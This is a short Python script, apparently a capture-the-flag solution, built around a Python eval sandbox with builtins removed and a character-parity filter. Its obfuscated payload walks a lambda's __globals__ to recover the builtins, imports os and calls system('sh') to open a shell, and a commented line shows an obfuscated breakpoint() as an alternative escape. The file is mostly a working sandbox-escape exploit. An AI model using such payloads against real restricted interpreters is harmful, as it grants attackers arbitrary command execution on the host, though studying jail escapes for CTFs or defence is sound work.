inp = ''' [ g:=f\t.__globals__,c:= g ["_"\'_\' \'b\'"u"\t"i"\'l\' \'t\'"i"\'n\'"s"\'_\'"_"],c.eval\t(\t"c"\'.\'"_"\'_\'"i"\t"m"\'p\'"o"\'r\' \'t\'"_"\'_\' \'(\' \'"\'"o"\t"s"\'"\'")"\'.\'"s"\t"y"\t"s"\'t\'"e"\t"m"\'(\' \'"\'"s"\'h\' \'"\'")") ]'''
f = lambda: None

for i, v in enumerate(inp):
    if v == "_":
        continue
    if not (ord(v) < 128 and i % 2 == ord(v) % 2):
        print('bad', i, v, ord(v))
        # exit()

print(eval(inp, {"__builtins__": None, 'f': f}))

# eval('b' 'r'"e""a""k"'p'"o""i"'n' 't' '('")")